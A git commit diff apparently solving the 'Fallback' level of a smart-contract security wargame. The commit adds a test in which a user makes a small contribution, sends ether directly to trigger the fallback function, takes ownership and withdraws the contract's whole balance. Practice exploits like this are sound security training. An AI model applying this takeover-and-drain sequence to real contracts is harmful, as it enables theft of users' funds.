321ecb7a1bfbf7f26e4fbe9e796e5c44e28036b0
Sergi Juanati <wint3rmute@gmail.com>
2021-03-11 08:54:04 +0100

    Added solution for Fallback

--- test/1-fallback.js
+++ test/1-fallback.js
@@ -1,18 +1,36 @@
 const { expectRevert } = require('@openzeppelin/test-helpers');
 const Fallback = artifacts.require('Fallback.sol');
 
+const ethToWei = (item) => web3.utils.toWei(item);
+
 contract('Fallback', (accounts) => {
     let fallback;
     const [owner, user1] = accounts;
 
     beforeEach(async () => {
-        fallback = await Fallback.new();
+        fallback = await Fallback.new({from: owner});
     });
 
-    it('should create an offer', async () => {
-        await fallback.contribute({ from: user1, value: 10 });
-        const con = await fallback.getContribution({ from: user1 });
-        console.log('con:', con.toNumber());
+    it('claim ownership & reduce contract balance to 0', async () => {
+
+        // Send some amount to pass 'contributions[msg.sender] > 0)'
+        await fallback.contribute({ from: user1, value: ethToWei('0.0005') });
+
+        // Send some amount to non existing function to access the callback function
+        // to get ownership
+        await fallback.sendTransaction({ from: user1, value: ethToWei('0.0001') });
+
+        // Check contract balance BEFORE
+        const balanceBefore = await web3.eth.getBalance(fallback.address);
+
+        // Withdraw all funds
+        await fallback.withdraw({ from: user1 });
+
+        // Check contract balance AFTER
+        const balanceAfter = await web3.eth.getBalance(fallback.address);
+
+        assert(balanceBefore === ethToWei('0.0006'));
+        assert(balanceAfter === '0');
     });
 
 });
